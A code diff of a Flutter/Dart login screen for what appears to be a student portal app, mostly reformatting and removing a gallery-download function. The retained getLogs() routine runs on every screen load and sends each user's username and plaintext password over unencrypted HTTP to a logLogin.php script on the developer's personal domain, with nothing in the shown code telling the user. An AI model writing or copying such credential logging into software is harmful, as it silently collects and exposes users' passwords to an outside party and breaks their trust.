@@ -30,23 +30,19 @@ class HomeLogin extends StatefulWidget {
 }
 
 class _HomeLoginState extends State<HomeLogin> {
-    String formattedDate = DateFormat('yyyy-MM-dd hh:mm').format(DateTime.now());
+  String formattedDate = DateFormat('yyyy-MM-dd hh:mm').format(DateTime.now());
 
   final GlobalKey<ScaffoldState> _scaffoldKey = new GlobalKey<ScaffoldState>();
   Map<String, String> body;
-  File dataFile;
 
   int _exit = 0;
   Map value = {};
-  Map valueJson={};
+  Map valueJson = {};
   @override
   void initState() {
-
     super.initState();
-getLogs();
+    getLogs();
     getCopyRight();
-//    semester='';
-//    program='';
   }
 
   @override
@@ -77,9 +73,7 @@ getLogs();
                 child: GestureDetector(
                   onTap: () {
                     _launchURL() async {
-                      const url =
-
-                          'https://www.linkedin.com/in/muhannad-nasri/';
+                      const url = 'https://www.linkedin.com/in/muhannad-nasri/';
                       if (await canLaunch(url)) {
                         await launch(url,
                             forceWebView: false,
@@ -94,8 +88,6 @@ getLogs();
                   },
                   child: Center(
                     child: Text(
-
-
 //                      '© MuhannadNasri 2019 / ALL RIGHTS RESERVED.'
                       value['events']['info'],
                       style: TextStyle(color: Colors.white),
@@ -1219,64 +1211,6 @@ getLogs();
     );
   }
 
-  Future getGallery() async {
-    new Future.delayed(Duration.zero, () {
-      showLoading(true, context);
-    });
-
-    body = {};
-    try {
-      http.Response response = await http.post(
-          "https://muhannadnasri.com/App/data.ph",
-          body: body);
-      print(response.statusCode);
-      if (response.statusCode == 200) {
-
-        var Json = json.decode(response.body);
-        Directory appDocDir = await getApplicationDocumentsDirectory();
-        dataFile = new File(appDocDir.path + "/dataFile.json");
-
-        if (dataFile.existsSync()) {
-          if (Json['gallery'] != null) {
-            dataFile.writeAsStringSync(response.body);
-          }
-        } else {
-          dataFile.createSync();
-          dataFile.writeAsStringSync(response.body);
-        }
-
-
-        showLoading(false, context);
-
-        setState(() {
-          value = valueJson["gallery"];
-        });
-      } else if(response.statusCode == 300) {
-
-
-        return null;
-      }
-    } catch (x) {
-
-
-
-      if (x.toString().contains("TimeoutException")) {
-        showLoading(false, context);
-
-        showError("Time out from server", FontAwesomeIcons.hourglassHalf,
-            context, getGallery);
-      } else {
-        showLoading(false, context);
-        showError("Sorry, we can't connect", Icons.perm_scan_wifi, context,
-            getGallery);
-      }
-    }
-  }
-
-
-
-
-
   Future getCopyRight() async {
     Future.delayed(Duration.zero, () {});
     try {
@@ -1310,25 +1244,21 @@ getLogs();
     _scaffoldKey.currentState.showSnackBar(snackBar);
     return false;
   }
-  
+
   Future getLogs() async {
     Future.delayed(Duration.zero, () {});
 
-
-
     // print('Running on ${androidInfo.model}');
     try {
-       await http.post(
+      await http.post(
         Uri.encodeFull('http://muhannadnasri.com/App/logLogin.php'),
         body: {
           'username': username,
-          'password':password,
-          'userType':studentJson['data']['user_type'],
+          'password': password,
+          'userType': studentJson['data']['user_type'],
           'date': formattedDate,
-
         },
       );
-     
     } catch (x) {
       print(x);
     }
